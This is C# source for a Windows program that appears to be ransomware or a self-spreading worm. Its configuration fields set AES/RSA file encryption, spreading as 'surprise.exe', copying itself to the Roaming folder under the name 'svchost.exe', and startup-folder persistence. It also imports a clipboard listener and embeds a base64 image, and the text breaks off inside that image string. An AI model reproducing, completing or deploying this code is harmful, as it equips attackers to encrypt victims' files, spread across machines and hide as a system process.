using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = false;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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